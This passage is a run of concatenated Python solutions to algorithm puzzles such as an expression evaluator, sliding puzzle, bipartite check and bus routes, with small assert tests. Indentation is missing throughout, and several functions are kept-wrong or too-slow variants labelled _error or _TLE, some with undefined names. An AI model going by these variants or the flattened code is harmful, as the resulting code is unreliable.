return ret
class Solution:
def numJewelsInStones(self, J: str, S: str) -> int:
targets = set(J)
ret = 0
for c in S:
if c in targets:
ret += 1
return ret
class Solution:
def calculate(self, s: str) -> int:
s = s + "\0"
ret, _ = self.eval(s, 0, [])
return ret
def eval(self, s, i, stk):
operand = 0
prev_op = "+"
while i < len(s):
c = s[i]
if c == " ":
pass
elif c.isdigit():
operand = operand * 10 + int(c)
elif c in ("+", "-", "*", "/", ")", "\0"):
if prev_op == "+":
stk.append(operand)
elif prev_op == "-":
stk.append(-operand)
elif prev_op == "*":
prev_operand = stk.pop()
stk.append(prev_operand * operand)
elif prev_op == "/":
prev_operand = stk.pop()
stk.append(int(prev_operand / operand))
if c in ("+", "-", "*", "/"):
operand = 0
prev_op = c
elif c in (")", "\0"):
return sum(stk), i
elif c == "(":
operand, i = self.eval(s, i + 1, [])
else:
raise
i += 1
if __name__ == "__main__":
assert Solution().calculate("(( ( ( 4- 2)+ ( 6+ 10 ) )+ 1) /( ( ( 7 + 9 )* ( 5*8) )- ( 5 + ( 2 * 10 ) ) ) )") == 0
assert Solution().calculate("(2+6* 3+5- (3*14/7+2)*5)+3") == -12
from typing import List
from collections import defaultdict
from copy import deepcopy
import heapq
final_pos = {
1: (0, 0),
2: (0, 1),
3: (0, 2),
4: (1, 0),
5: (1, 1),
0: (1, 2),
}
dirs = (
(0, -1),
(0, 1),
(-1, 0),
(1, 0),
)
class Solution:
def slidingPuzzle(self, board: List[List[int]]) -> int:
visited = defaultdict(bool)
m, n = len(board), len(board[0])
q = [(self.heuristic_dist(board) + 0, 0, board)]
target = [
[1, 2, 3],
[4, 5, 0],
]
while q:
heu, cur_dist, board = heapq.heappop(q)
visited[self.ser(board)] = True
if board == target:
return cur_dist
cur_dist += 1
i, j = self.zero_pos(board)
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n:
B = deepcopy(board)
B[I][J], B[i][j] = B[i][j], B[I][J]
if not visited[self.ser(B)]:
heapq.heappush(q, (self.heuristic_dist(B) + cur_dist, cur_dist, B))
return -1
def zero_pos(self, board):
for i, row in enumerate(board):
for j, v in enumerate(row):
if v == 0:
return i, j
raise
def heuristic_dist(self, board):
ret = 0
for i, row in enumerate(board):
for j, v in enumerate(row):
if v != 0:
I, J = final_pos[v]
ret += abs(i - I) + abs(j - J)
return ret
def ser(self, board):
return tuple(
tuple(row)
for row in board
)
if __name__ == "__main__":
assert Solution().slidingPuzzle([[1,2,3],[4,0,5]]) == 1
assert Solution().slidingPuzzle([[1,2,3],[5,4,0]]) == -1
class Solution:
def kthGrammar(self, N: int, K: int) -> int:
return self.dfs(N, K, True)
def dfs(self, N, K, not_flip):
if N == 1:
return 0 if not_flip else 1
half_l = 2 ** (N - 1) // 2
if K <= half_l:
return self.dfs(N - 1, K, not_flip)
else:
return self.dfs(N - 1, K - half_l, not not_flip)
def kthGrammar_TLE(self, N: int, K: int) -> int:
row = 0
pos = 1
for n in range(1, N):
row = (row << pos) + (~row & 2 ** pos - 1)
pos *= 2
ret = row >> pos - K & 1
return ret
if __name__ == "__main__":
assert Solution().kthGrammar(1, 1) == 0
assert Solution().kthGrammar(2, 1) == 0
assert Solution().kthGrammar(2, 2) == 1
assert Solution().kthGrammar(4, 5) == 1
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.prev = None
self.ret = float('inf')
def minDiffInBST(self, root: TreeNode) -> int:
if not root:
return
self.minDiffInBST(root.left)
if self.prev:
self.ret = min(self.ret, root.val - self.prev)
self.prev = root.val
self.minDiffInBST(root.right)
return self.ret
from typing import List
class Solution:
def __init__(self):
self.ret = []
def letterCasePermutation(self, S: str) -> List[str]:
S_lst = list(S)
self.dfs([], S_lst, 0)
return [
"".join(e)
for e in self.ret
]
def dfs(self, lst, S_lst, i):
if len(lst) == len(S_lst):
self.ret.append(list(lst))
return
if S_lst[i].isdigit():
lst.append(S_lst[i])
self.dfs(lst, S_lst, i + 1)
lst.pop()
else:
lst.append(S_lst[i].lower())
self.dfs(lst, S_lst, i + 1)
lst.pop()
lst.append(S_lst[i].upper())
self.dfs(lst, S_lst, i + 1)
lst.pop()
if __name__ == "__main__":
assert Solution().letterCasePermutation("a1b2") == ['a1b2', 'a1B2', 'A1b2', 'A1B2']
from collections import defaultdict
class Solution:
def isBipartite(self, graph: List[List[int]]) -> bool:
G = graph
color = defaultdict(int)
for k in range(len(G)):
if k not in color:
color[k] = 0
if not self.dfs(G, k, color):
return False
return True
def dfs(self, G, u, color):
for nbr in G[u]:
if nbr in color:
if color[nbr] == color[u]:
return False
else:
color[nbr] = 1 - color[u]
if not self.dfs(G, nbr, color):
return False
return True
class SolutionError:
def isBipartite(self, graph: List[List[int]]) -> bool:
G = graph
A, B = set(), set()
visited = defaultdict(bool)
for k in range(len(G)):
if not visited[k]:
if not self.dfs(G, visited, k, A, B, True):
return False
return True
def dfs(self, G, visited, u, A, B, is_A):
visited[u] = True
if is_A:
A.add(u)
else:
B.add(u)
for nbr in G[u]:
if nbr in A if is_A else B:
return False
if not visited[nbr]:
if not self.dfs(G, visited, nbr, A, B, False):
return False
return True
from collections import defaultdict
import heapq
class Solution:
def findCheapestPrice(self, n: int, flights: List[List[int]], src: int, dst: int, K: int) -> int:
G = defaultdict(dict)
visited = defaultdict(bool)
for u, v, w in flights:
G[u][v] = w
pq = [(0, 0, src)]
while pq:
cost, k, u = heapq.heappop(pq)
if u == dst:
return cost
stops = k - 1 + 1
if stops <= K:
for v, w in G[u].items():
heapq.heappush(pq, (cost + w, k + 1, v))
return -1
from typing import List
from collections import defaultdict
class Solution:
def numMatchingSubseq(self, S: str, words: List[str]) -> int:
itrs_m = defaultdict(list)
for w in words:
itrs_m[w[0]].append(
iter(w[1:])
)
for a in S:
itrs = itrs_m.pop(a, [])
for itr in itrs:
v = next(itr, None)
itrs_m[v].append(itr)
return len(itrs_m[None])
def numMatchingSubseq_TLE(self, S: str, words: List[str]) -> int:
I = [0 for _ in words]
for a in S:
for wi, i in enumerate(I):
if i < len(words[wi]) and words[wi][i] == a:
I[wi] += 1
return sum(
1
for wi, i in enumerate(I)
if i == len(words[wi])
)
if __name__ == "__main__":
assert Solution().numMatchingSubseq("abcde", ["a", "bb", "acd", "ace"]) == 3
from typing import List
class Solution:
def numSubarrayBoundedMax(self, A: List[int], L: int, R: int) -> int:
F = 0
ret = 0
prev = -1
for i, a in enumerate(A):
if L <= a <= R:
F = i - prev
ret += F
elif a > R:
F = 0
prev = i
else:
ret += F
return ret
def numSubarrayBoundedMax_error(self, A: List[int], L: int, R: int) -> int:
F = 0
ret = 0
for a in A:
if L <= a <= R:
F += 1
ret += F
elif a > R:
F = 0
else:
ret += F
return ret
class Solution:
def rotateString(self, A: str, B: str) -> bool:
if len(A) != len(B):
return False
if not A and not B:
return True
for i in range(1, len(A)):
for j in range(len(B)):
if A[(i + j) % len(A)] != B[j]:
break
else:
return True
return False
from typing import List
class Solution:
def allPathsSourceTarget(self, graph: List[List[int]]) -> List[List[int]]:
G = graph
ret = []
visited = [False for _ in G]
self.dfs(G, 0, len(G) - 1, [0], visited, ret)
return ret
def dfs(self, G, cur, d, cur_path, visited, ret):
if cur == d:
ret.append(list(cur_path))
return
for nbr in G[cur]:
if not visited[nbr]:
visited[nbr] = True
cur_path.append(nbr)
self.dfs(G, nbr, d, cur_path, visited, ret)
cur_path.pop()
visited[nbr] = False
from collections import defaultdict
class Solution:
def champagneTower(self, poured: int, query_row: int, query_glass: int) -> float:
G = defaultdict(lambda: defaultdict(int))
G[0][0] = poured
for i in range(query_row):
for j in range(i+1):
excess = max(0, G[i][j] - 1)
G[i+1][j] += excess / 2
G[i+1][j+1] += excess / 2
return min(1, G[query_row][query_glass])
class Solution:
def minSwap(self, A: List[int], B: List[int]) -> int:
n = len(A)
F = [[0 for _ in range(n)] for _ in range(2)]
F[1][0] = 1
for i in range(1, n):
if A[i] > max(A[i-1], B[i-1]) and B[i] > max(A[i-1], B[i-1]):
F[0][i] = min(F[0][i-1], F[1][i-1])
F[1][i] = min(F[0][i-1], F[1][i-1]) + 1
elif A[i] > A[i-1] and B[i] > B[i-1]:
F[0][i] = F[0][i-1]
F[1][i] = F[1][i-1] + 1
else:
F[0][i] = F[1][i-1]
F[1][i] = F[0][i-1] + 1
return min(F[0][n-1], F[1][n-1])
def minSwap_error(self, A: List[int], B: List[int]) -> int:
t = 0
for i in range(1, len(A)):
if A[i] <= A[i-1] or B[i] <= B[i-1]:
t += 1
if t < i + 1 - t:
A[i], B[i] = B[i], A[i]
else:
t = i + 1 - t
return t
if __name__ == "__main__":
assert Solution().minSwap([0,4,4,5,9], [0,1,6,8,10])
from typing import List, Set
class Solution:
def eventualSafeNodes(self, graph: List[List[int]]) -> List[int]:
visit: List[int] = [0 for _ in graph]
acyclic: Set[int] = set()
for u in range(len(graph)):
if visit[u] == 0:
self.dfs(graph, u, visit, acyclic)
return [
u
for u in range(len(graph))
if u in acyclic
]
def dfs(self, graph, cur, visit, acyclic):
visit[cur] = 1
for nbr in graph[cur]:
if visit[nbr] == 2:
if nbr in acyclic:
continue
else:
break
if visit[nbr] == 1:
break
if visit[nbr] == 0 and not self.dfs(graph, nbr, visit, acyclic):
break
else:
acyclic.add(cur)
visit[cur] = 2
return True
visit[cur] = 2
return False
if __name__ == "__main__":
assert Solution().eventualSafeNodes([[1,2],[2,3],[5],[0],[5],[],[]]) == [2,4,5,6]
from typing import List
class Solution:
def maxIncreaseKeepingSkyline(self, grid: List[List[int]]) -> int:
m, n = len(grid), len(grid[0])
lr = [
max(row)
for row in grid
]
tb = [
max(
grid[i][j]
for i in range(m)
)
for j in range(n)
]
ret = 0
for i in range(m):
for j in range(n):
diff = min(lr[i], tb[j]) - grid[i][j]
ret += diff
return ret
from typing import List
class Solution:
def largestSumOfAverages(self, A: List[int], K: int) -> float:
n = len(A)
prefix_sum = [0 for _ in range(n+1)]
for i in range(1, n+1):
prefix_sum[i] = prefix_sum[i-1] + A[i-1]
F = {}
self.dfs(A, n, prefix_sum, F, K)
return F[n, K]
def dfs(self, A, l, prefix_sum, F, k):
if l < k:
return -float('inf')
if (l, k) not in F:
if k == 1:
ret = prefix_sum[l] / l
else:
n = len(A)
ret = -float('inf')
for j in range(l-1, -1, -1):
trail = (prefix_sum[l] - prefix_sum[j]) / (l - j)
ret = max(
ret,
self.dfs(A, j, prefix_sum, F, k-1) + trail
)
F[l, k] = ret
return F[l, k]
def dfs_error(self, A, i, prefix_sum, F, k):
if (i, k) not in F:
ret = 0
avg = prefix_sum[i] / i
ret += avg
ret += max(
self.dfs(A, j, prefix_sum, F, k - 1)
for j in range(i, len(A))
)
F[i, k] = ret
return F[i, k]
if __name__ == "__main__":
assert Solution().largestSumOfAverages([9,1,2,3,9], 3) == 20
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from typing import Tuple
class Solution:
def pruneTree(self, root: TreeNode) -> TreeNode:
root, _ = self.prune(root)
return root
def prune(self, node) -> Tuple[TreeNode, bool]:
if not node:
return None, False
node.left, contain_left = self.prune(node.left)
node.right, contain_right = self.prune(node.right)
if not contain_left and not contain_right and node.val == 0:
return None, False
return node, True
from typing import List
from collections import defaultdict
class Solution:
def numBusesToDestination(self, routes: List[List[int]], S: int, T: int) -> int:
if S == T:
return 0
routes = [set(e) for e in routes]
G = defaultdict(set)
for i in range(len(routes)):
for j in range(i + 1, len(routes)):
stops_1, stops_2 = routes[i], routes[j]
for stop in stops_1:
if stop in stops_2:
G[i].add(j)
G[j].add(i)
break
q = [i for i, stops in enumerate(routes) if S in stops]
target_set = set([i for i, stops in enumerate(routes) if T in stops])
visited = defaultdict(bool)
for i in q:
visited[i] = True
step = 1
while q:
cur_q = []
for e in q:
if e in target_set:
return step
for nbr in G[e]:
if not visited[nbr]:
visited[nbr] = True
cur_q.append(nbr)
step += 1
q = cur_q
return -1
def numBusesToDestination_TLE(self, routes: List[List[int]], S: int, T: int) -> int:
G = defaultdict(set)
for stops in routes:
for i in range(len(stops)):
for j in range(i + 1, len(stops)):
u, v = stops[i], stops[j]
G[u].add(v)
G[v].add(u)
q = [S]
step = 0
visited = defaultdict(bool)
visited[S] = True
while q:
cur_q = []
for e in q:
if e == T:
return step
for nbr in G[e]:
if not visited[nbr]:
visited[nbr] = True
cur_q.append(nbr)
step += 1
q = cur_q
return -1
if __name__ == "__main__":
assert Solution().numBusesToDestination([[1, 2, 7], [3, 6, 7]], 1, 6) == 2
from typing import List
class Solution:
def minimumLengthEncoding(self, words: List[str]) -> int:
root = {}
ends = []
for word in set(words):
cur = root
for c in word[::-1]:
nxt = cur.get(c, {})
cur[c] = nxt
cur = nxt
ends.append((cur, len(word)))
return sum(
l + 1
for node, l in ends
if len(node) == 0
)
if __name__ == "__main__":
assert Solution().minimumLengthEncoding(["time", "me", "bell"]) == 10
from typing import List
class Solution:
def shortestToChar(self, S: str, C: str) -> List[int]:
idx = [
i
for i in range(len(S))
if S[i] == C
]
idx = [-float("inf")] + idx + [float("inf")]
ret = []
i = 0
for j in range(len(S)):
while not idx[i] <= j < idx[i+1]:
i += 1
ret.append(min(j - idx[i], idx[i+1] - j))
return ret
from typing import List
MOD =  10 ** 9 + 7
class Solution:
def numFactoredBinaryTrees(self, A: List[int]) -> int:
A.sort()
F = {}
for i in range(len(A)):
F[A[i]] = 1
for j in range(i):
if A[i] % A[j] == 0 and A[i] // A[j] in F:
F[A[i]] += F[A[j]] * F[A[i] // A[j]]
F[A[i]] %= MOD
return sum(F.values()) % MOD
from typing import List
class Solution:
def maxProfitAssignment(self, difficulty: List[int], profit: List[int], worker: List[int]) -> int:
tasks = list(sorted(zip(profit, difficulty)))
worker.sort()
i = len(tasks) - 1
j = len(worker) - 1
ret = 0
while i >= 0 and j >= 0:
pro, diff = tasks[i]
if worker[j] >= diff:
ret += pro
j -= 1
else:
i -= 1
return ret
class Solution:
def consecutiveNumbersSum(self, N: int) -> int:
cnt = 0
k = 0
while True:
k += 1
x0k = N - k * (k - 1) // 2
if x0k <= 0 :
break
if x0k % k == 0:
cnt += 1
return cnt
def consecutiveNumbersSum_error(self, N: int) -> int:
cnt = 0
for k in range(1, int(N ** 0.5)):
x0k = N - k * (k - 1) // 2
if x0k % k == 0:
cnt += 1
return cnt
def consecutiveNumbersSum_error(self, N: int) -> int:
if N == 1:
return 1
cnt = 0
for i in range(1, N):
d = N // i
r = N % i
if r == 0 and d - i // 2 > 0:
cnt += 1
elif r == 1 and N == (d + d + 1) * i // 2:
cnt += 1
return cnt
from typing import List
class Solution:
def largeGroupPositions(self, S: str) -> List[List[int]]:
i = 0
j = 0
ret = []
n = len(S)
while j < n:
while j < n and S[i] == S[j]:
j += 1
if j - i >= 3:
ret.append([i, j - 1])
i = j
return ret
from typing import List
class Solution:
def flipAndInvertImage(self, A: List[List[int]]) -> List[List[int]]:
for row in A:
prev = list(row)
for i in range(len(row)):
row[i] = prev[-1-i] ^ 1
return A
from typing import List
class Solution:
def isRectangleOverlap(self, rec1: List[int], rec2: List[int]) -> bool:
return not (
rec1[2] <= rec2[0] or
rec1[0] >= rec2[2] or
rec1[1] >= rec2[3] or
rec1[3] <= rec2[1]
)
def isRectangleOverlap_error(self, rec1: List[int], rec2: List[int]) -> bool:
if rec1[0] > rec2[0]:
return self.isRectangleOverlap(rec2, rec1)
return (
rect1[0] < rect2[0] < rec1[2] and
(
rec2[1] < rect1[3] < rect2[3] or
rec2[3] < rect1[3] < rect2[1]
)
)
class Solution:
def new21Game(self, N: int, K: int, W: int) -> float:
if K == 0:
return 1
F = [0 for _ in range(N+1)]
F[0] = 1
cur_sum = F[0]
ret = 0
for i in range(1, N+1):
F[i] = cur_sum * (1/W)
if i >= K:
ret += F[i]
else:
cur_sum += F[i]
if i - W >= 0:
cur_sum -= F[i - W]
return ret
def new21Game_error(self, N: int, K: int, W: int) -> float:
F = [0 for _ in range(K+W+1)]
F[0] = 1
for i in range(1, K+W+1):
for j in range(W, 0, -1):
if i - j >= K:
break
if i - j >= 0:
F[i] += F[i-j] * 1 / W
ret = sum(F[1:N+1])
print(F, ret)
return ret
if __name__ == "__main__":
assert Solution().new21Game(6, 1, 10) == 0.6
class Solution:
def pushDominoes(self, dominoes: str) -> str:
n = len(dominoes)
L = [float("inf") for i in range(n)]
R = [float("inf") for i in range(n)]
for i in range(n-1, -1, -1):
if dominoes[i] == "L":
L[i] = 0
elif dominoes[i] == "R":
L[i] = float("inf")
elif i + 1 < n:
L[i] = L[i+1] + 1
for i in range(n):
if dominoes[i] == "R":
R[i] = 0
elif dominoes[i] == "L":
R[i] = float("inf")
elif i - 1 >= 0:
R[i] = R[i-1] + 1
ret = []
for i in range(n):
d = min(R[i], L[i])
if d == float("inf"):
cur = "."
elif R[i] == L[i]:
cur = "."
elif d == R[i]:
cur = "R"
else:
cur = "L"
ret.append(cur)
return "".join(ret)
if __name__ == "__main__":
assert Solution().pushDominoes(".L.R...LR..L..") == "LL.RR.LLRRLL.."
from typing import List
class Solution:
def canVisitAllRooms(self, G: List[List[int]]) -> bool:
n = len(G)
visited = [0 for _ in range(n)]
self.dfs(G, 0, visited)
return all(e == 1 for e in visited)
def dfs(self, G, u, visited):
visited[u] = 1
for nbr in G[u]:
if not visited[nbr]:
self.dfs(G, nbr, visited)
if __name__ == "__main__":
assert Solution().canVisitAllRooms([[1],[2],[3],[]]) == True
assert Solution().canVisitAllRooms([[1,3],[3,0,1],[2],[0]]) == False
from typing import List
MAX = 2 ** 31 - 1
class Solution:
def splitIntoFibonacci(self, S: str) -> List[int]:
l = len(S)
for i in range(1, l + 1):
num_str = S[:i]
if len(num_str) > 1 and num_str.startswith("0"):
continue
num = int(num_str)
if num > MAX:
break
for j in range(i + 1, l + 1):
num2_str = S[i:j]
if len(num2_str) > 1 and num2_str.startswith("0"):
continue
num2 = int(num2_str)
if num2 > MAX:
break
ret = [num, num2]
k = j
while k < l:
nxt = ret[-1] + ret[-2]
if nxt > MAX:
break
nxt_str = str(nxt)
if S[k:k+len(nxt_str)] == nxt_str:
k = k + len(nxt_str)
ret.append(nxt)
else:
break
else:
if k == l and len(ret) >= 3:
return ret
return []
if __name__ == "__main__":
assert Solution().splitIntoFibonacci("123456579") == [123,456,579]
assert Solution().splitIntoFibonacci("01123581321345589") == [0,1,1,2,3,5,8,13,21,34,55,89]
class Solution:
def backspaceCompare(self, S: str, T: str) -> bool:
return self.make_stk(S) == self.make_stk(T)
def make_stk(self, S):
stk = []
for s in S:
if s == "#":
if stk:
stk.pop()
else:
stk.append(s)
return stk
from typing import List
class Solution:
def longestMountain(self, A: List[int]) -> int:
ret = 0
up_cnt = 0
down_cnt = 0
for i in range(1, len(A)):
if down_cnt and A[i] >= A[i-1]:
up_cnt = 0
down_cnt = 0
if A[i] > A[i-1]:
up_cnt += 1
elif A[i] < A[i-1]:
down_cnt += 1
if up_cnt and down_cnt:
ret = max(ret, up_cnt + down_cnt + 1)
return ret
def longestMountain(self, A: List[int]) -> int:
n = len(A)
U = [0 for _ in A]
D = [0 for _ in A]
for i in range(1, n):
if A[i] > A[i-1]:
U[i] = U[i-1] + 1
for i in range(n-2, -1, -1):
if A[i] > A[i+1]:
D[i] = D[i+1] + 1
ret = 0
for i in range(n):
if U[i] > 0 and D[i] > 0:
ret = max(ret, U[i] + D[i] + 1)
return ret
def longestMountain_complicated(self, A: List[int]) -> int:
ret = 0
l = 1
expect_incr = True
for i in range(1, len(A)):
if expect_incr:
if A[i] > A[i-1]:
l += 1
elif A[i] < A[i-1] and l >= 2:
expect_incr = False
l += 1
ret = max(ret, l)
else:
l = 1
else:
if A[i] < A[i-1]:
l += 1
ret = max(ret, l)
elif A[i] == A[i-1]:
expect_incr = True
l = 1
else:
expect_incr = True
l = 2
return ret if ret >= 3 else 0
if __name__ == "__main__":
assert Solution().longestMountain([2,1,4,7,3,2,5]) == 5
assert Solution().longestMountain([9,8,7,6,5,4,3,2,1,0]) == 0
from typing import List
from collections import Counter, deque
import heapq
class Solution:
def isNStraightHand(self, A: List[int], W: int) -> bool:
q = deque()
counter = Counter(A)
prev = 0
prev_cnt = 0
for k in sorted(counter):
if prev_cnt > counter[k] or prev_cnt > 0 and k > prev + 1:
return False
q.append(counter[k] - prev_cnt)
prev, prev_cnt = k, counter[k]
if len(q) == W:
c = q.popleft()
prev_cnt -= c
return prev_cnt == 0
def isNStraightHand_heap(self, A: List[int], W: int) -> bool:
A.sort()
if len(A) % W != 0:
return False
if W == 1:
return True
h = []
for a in A:
if not h:
h = [(a, [a])]
continue
if a == h[0][1][-1]:
heapq.heappush(h, (a, [a]))
elif a == h[0][1][-1] + 1:
_, lst = heapq.heappop(h)
lst.append(a)
if len(lst) < W:
heapq.heappush(h, (a, lst))
else:
return False
if h:
return False
return True
if __name__ == "__main__":
assert Solution().isNStraightHand([1,2,3,6,2,3,4,7,8], 3) == True
assert Solution().isNStraightHand([1,1,2,2,3,3], 3) == True
from typing import List
class Solution:
def shiftingLetters(self, S: str, shifts: List[int]) -> str:
n = len(shifts)
for i in range(n-2, -1, -1):
shifts[i] += shifts[i+1]
shifts[i] %= 26
ret = []
for i, s in enumerate(S):
b = (ord(s) + shifts[i] - ord('a')) % 26 + ord('a')
b = chr(b)
ret.append(b)
return "".join(ret)
if __name__ == "__main__":
assert Solution().shiftingLetters("abc", [3, 5, 9]) == "rpl"
from typing import List
class Solution:
def maxDistToClosest(self, seats: List[int]) -> int:
n = len(seats)
L = [float("inf") for _ in range(n)]
R = [float("inf") for _ in range(n)]
for i in range(n):
if seats[i] == 1:
L[i] = 0
elif i - 1 >= 0:
L[i] = L[i-1] + 1
for i in range(n-1, -1 , -1):
if seats[i] == 1:
R[i] = 0
elif i + 1 < n:
R[i] = R[i+1] + 1
return max(
min(L[i], R[i])
for i in range(n)
)
def maxDistToClosest2(self, seats: List[int]) -> int:
idxes = []
for i, e in enumerate(seats):
if e == 1:
idxes.append(i)
ret = [-float("inf"), 0]
n = len(seats)
for i, j in zip((0, n-1), (0, -1)):
dist = abs(i - idxes[j])
if dist > ret[0]:
ret = [dist, i]
for j in range(len(idxes) - 1):
i = (idxes[j] + idxes[j+1]) // 2
dist = min(abs(i - idxes[j]), abs(i - idxes[j+1]))
if dist > ret[0]:
ret = [dist, i]
return ret[0]
if __name__ == "__main__":
assert Solution().maxDistToClosest([1,0,0,0,1,0,1]) == 2
import bisect
class ExamRoom:
def __init__(self, N: int):
self.N = N
self.idxes = []
def seat(self) -> int:
if not self.idxes:
ret_idx = 0
else:
max_dist, ret_idx = 0, 0
dist = self.idxes[0] - 0
if dist > max_dist:
max_dist = dist
ret_idx = 0
for j in range(len(self.idxes)-1):
i = (self.idxes[j] + self.idxes[j+1]) // 2
dist = min(abs(self.idxes[j] - i), abs(self.idxes[j+1] - i))
if dist > max_dist:
max_dist = dist
ret_idx = i
dist = self.N-1 - self.idxes[-1]
if dist > max_dist:
max_dist = dist
ret_idx = self.N-1
bisect.insort(self.idxes, ret_idx)
return ret_idx
def leave(self, p: int) -> None:
self.idxes.remove(p)
class Solution:
def scoreOfParentheses(self, S: str) -> int:
stk = []
ret = 0
for s in S:
if s == "(":
stk.append(0)
else:
cur = stk.pop()
score = max(2 * cur, 1)
if stk:
stk[-1] += score
else:
ret += score
return ret
def scoreOfParentheses_error(self, S: str) -> int:
ret = 0
cur_stk = []
for s in S:
if s == "(":
cur_stk.append(0)
stk.append(s)
else:
stk.pop()
if cur_stk[-1] == 0:
cur_stk[-1] = 1
else:
cur_stk[-1] *= 2
if not stk:
ret += cur
cur = 0
return ret
if __name__ == "__main__":
assert Solution().scoreOfParentheses("(())") == 2
assert Solution().scoreOfParentheses("(()(()))") == 6
USED = True
class Solution:
def buddyStrings(self, A: str, B: str) -> bool:
if len(A) != len(B):
return False
if A == B:
seen = set()
for a in A:
if a in seen:
return True
seen.add(a)
else:
return False
pair = None
for i in range(len(A)):
if A[i] != B[i]:
if not pair:
pair = (A[i], B[i])
elif pair == (B[i], A[i]):
pair = USED
else:
return False
if pair is None or pair is USED:
return True
return False
class Solution:
def lemonadeChange(self, bills: List[int]) -> bool:
five, ten, twenty = 0, 0, 0
for b in bills:
if b == 5:
five += 1
elif b == 10:
if five < 1:
return False
five -= 1
ten += 1
else:
if ten >= 1 and five >= 1:
ten -= 1
five -= 1
elif five >= 3:
five -= 3
else:
return False
return True
from typing import List
class Solution:
def matrixScore(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
ret = 0
ret += (1 << (n-1)) * m
for j in range(1, n):
cnt = 0
for i in range(m):
if A[i][j] == A[i][0]:
cnt += 1
cnt = max(cnt, m-cnt)
ret += (1 << (n-1-j)) * cnt
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def distanceK(self, root: TreeNode, target: TreeNode, K: int) -> List[int]:
ret = []
self.ancestor_dist(root, K, target, ret)
return ret
def dfs_down(self, node, d, ret):
if not node:
return
if d == 0:
ret.append(node.val)
else:
self.dfs_down(node.left, d - 1, ret)
self.dfs_down(node.right, d - 1, ret)
def ancestor_dist(self, node, K, target, ret):
if not node:
return float('inf')
if node.val == target.val:
self.dfs_down(node, K, ret)
return 0
else:
l = self.ancestor_dist(node.left, K, target, ret)
r = self.ancestor_dist(node.right, K, target, ret)
d = min(l, r) + 1
if d == K:
ret.append(node.val)
elif l == float('inf'):
self.dfs_down(node.left, K - d - 1, ret)
else:
self.dfs_down(node.right, K - d - 1, ret)
return d
class SolutionComplicated:
def distanceK(self, root: TreeNode, target: TreeNode, K: int) -> List[int]:
ret = []
self.dfs1(target, K, ret)
hm = {}
self.ancestor_dist(root, target, hm)
self.dfs2(root, target, K, float("inf"), hm, ret)
return ret
def dfs1(self, node, K, ret):
if not node:
return
if K == 0:
ret.append(node.val)
else:
self.dfs1(node.left, K-1, ret)
self.dfs1(node.right, K-1, ret)
def ancestor_dist(self, node, target, hm):
if not node:
return float('inf')
if node.val == target.val:
hm[node.val] = 0
else:
left = self.ancestor_dist(node.left, target, hm)
right = self.ancestor_dist(node.right, target, hm)
hm[node.val] = min(left, right) + 1
return hm[node.val]
def dfs2(self, node, target, K, dist, hm, ret):
if not node:
return
if node.val == target.val:
return
dist = min(dist, hm[node.val])
if dist == K:
ret.append(node.val)
self.dfs2(node.left, target, K, dist + 1, hm, ret)
self.dfs2(node.right, target, K, dist + 1, hm, ret)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.deepest = -1
self.deepest_nodes = None
self.ret = None
def subtreeWithAllDeepest(self, root: TreeNode) -> TreeNode:
self.down(root, 0)
if len(self.deepest_nodes) == 1:
return self.deepest_nodes.pop()
self.count(root)
return self.ret
def down(self, node: TreeNode, d: int) -> None:
if not node:
return
if d > self.deepest:
self.deepest = d
self.deepest_nodes = set([node])
elif d == self.deepest:
self.deepest_nodes.add(node)
self.down(node.left, d + 1)
self.down(node.right, d + 1)
def count(self, node: TreeNode) -> int:
if not node:
return 0
l = self.count(node.left)
r = self.count(node.right)
if l != 0 and r != 0 and l + r == len(self.deepest_nodes):
self.ret = node
count = l + r
if node in self.deepest_nodes:
count += 1
return count
from collections import Counter
class Solution:
def reorderedPowerOf2(self, N: int) -> bool:
counts = Counter(str(N))
for i in range(31):
if counts == Counter(str(1 << i)):
return True
else:
return False
from typing import List
from collections import defaultdict
class Solution:
def advantageCount(self, A: List[int], B: List[int]) -> List[int]:
idxes = defaultdict(list)
for i, b in enumerate(B):
idxes[b].append(i)
n = len(A)
A.sort()
B.sort()
ret = [None for _ in range(n)]
not_used = []
j = 0
for a in A:
if a > B[j]:
i = idxes[B[j]].pop()
ret[i] = a
j += 1
else:
not_used.append(a)
for i in range(n):
if ret[i] is None:
ret[i] = not_used.pop()
return ret
if __name__ == "__main__":
assert Solution().advantageCount([2,7,11,15], [1,10,4,11]) == [2,11,7,15]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def leafSimilar(self, root1: TreeNode, root2: TreeNode) -> bool:
itr1 = self.dfs(root1)
itr2 = self.dfs(root2)
while True:
a = next(itr1, None)
b = next(itr2, None)
if a != b:
return False
if a is None and b is None:
break
return True
def dfs(self, node):
stk = [node]
while stk:
cur = stk.pop()
if not cur:
continue
if not cur.left and not cur.right:
yield cur.val
else:
stk.append(cur.right)
stk.append(cur.left)
from typing import List
class Solution:
def lenLongestFibSubseq(self, A: List[int]) -> int:
n = len(A)
F = [[0 for _ in range(n)] for _ in range(n)]
for i in range(n):
F[i][i] = 1
for j in range(i):
F[i][j] = 2
idxes = {}
for i in range(n):
idxes[A[i]] = i
for i in range(n):
for j in range(i):
Ak = A[i] + A[j]
if Ak in idxes:
k = idxes[Ak]
F[k][i] = max(F[k][i], F[i][j] + 1)
return max(
F[i][j] if F[i][j] > 2 else 0
for i in range(n)
for j in range(i)
)
def lenLongestFibSubseq_TLE(self, A: List[int]) -> int:
n = len(A)
F = [[0 for _ in range(n)] for _ in range(n)]
for i in range(n):
F[i][i] = 1
for j in range(i):
F[i][j] = 2
for k in range(n):
for i in range(k):
for j in range(i):
if A[i] + A[j] == A[k]:
F[k][i] = max(F[k][i], F[i][j] + 1)
return max(
F[i][j] if F[i][j] > 2 else 0
for i in range(n)
for j in range(i)
)
if __name__ == "__main__":
assert Solution().lenLongestFibSubseq([1,2,3,4,5,6,7,8]) == 5
from typing import List
import math
class Solution:
def minEatingSpeed(self, piles: List[int], H: int) -> int:
if len(piles) > H:
return None
n = len(piles)
hi = max(piles) + 1
lo = 1
while lo < hi:
mid = (lo + hi) // 2
if sum(
math.ceil(piles[i] / mid)
for i in range(n)
) > H:
lo = mid + 1
else:
hi = mid
return lo
